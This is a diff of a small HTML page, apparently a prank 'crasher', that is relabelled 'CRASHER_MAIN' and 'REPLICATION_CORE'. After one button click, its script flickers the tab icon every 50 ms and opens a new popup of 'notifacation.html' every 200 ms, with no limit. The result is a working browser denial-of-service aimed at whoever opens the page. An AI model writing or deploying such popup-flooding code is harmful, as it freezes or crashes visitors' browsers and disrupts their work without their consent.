@@ -1,34 +1,34 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>MASTER_REPLICATOR</title>
-    <link id="icon" rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><rect width='100' height='100' fill='white'/></svg>">
+    <title>CRASHER_MAIN</title>
+    <link id="fav" rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><rect width='100' height='100' fill='white'/></svg>">
     <style>
-        body { background: #000; color: #00ff00; font-family: 'Courier New', monospace; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        #box { border: 1px solid #00ff00; padding: 30px; text-align: center; box-shadow: 0 0 20px #00ff00; }
-        button { margin-top: 20px; padding: 15px 40px; background: #00ff00; border: none; font-weight: bold; cursor: pointer; color: black; }
-        button:hover { background: #fff; }
+        body { background: #000; color: #fff; font-family: 'Courier New', monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; text-align: center; }
+        .border { border: 2px solid #fff; padding: 50px; box-shadow: 0 0 15px #fff; }
+        button { padding: 20px 40px; background: #fff; border: none; font-weight: bold; cursor: pointer; font-size: 1.2rem; }
+        button:hover { background: #ff0000; color: #fff; }
     </style>
 </head>
 <body>
-    <div id="box">
-        <h1>LINKED_PROTOCOL</h1>
-        <p>This will launch the Notification Glitch in multiple tabs.</p>
-        <button onclick="ignite()">START ALL SYSTEMS</button>
+    <div class="border">
+        <h1>REPLICATION_CORE</h1>
+        <p>Target: notifacation.html</p>
+        <button onclick="start()">EXECUTE</button>
     </div>
 
     <script>
-        function ignite() {
-            // 1. Favicon Glitch
+        function start() {
+            // Tab icon glitch
             setInterval(() => {
                 const p = () => Math.floor(Math.random() * 100);
-                document.getElementById('icon').href = `data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><polygon points='${p()},${p()} ${p()},${p()} ${p()},${p()}' fill='white'/></svg>`;
-            }, 40);
+                document.getElementById('fav').href = `data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><polygon points='${p()},${p()} ${p()},${p()} ${p()},${p()}' fill='white'/></svg>`;
+            }, 50);
 
-            // 2. The Spammer
-            // This opens "notif.html" every 200ms
+            // Opens "notifacation.html" every 200ms
+            // MAKE SURE THE OTHER FILE IS NAMED EXACTLY: notifacation.html
             setInterval(() => {
-                window.open('notif.html', '_blank', 'width=500,height=500');
+                window.open('notifacation.html', '_blank', 'width=400,height=400');
             }, 200);
         }
     </script>
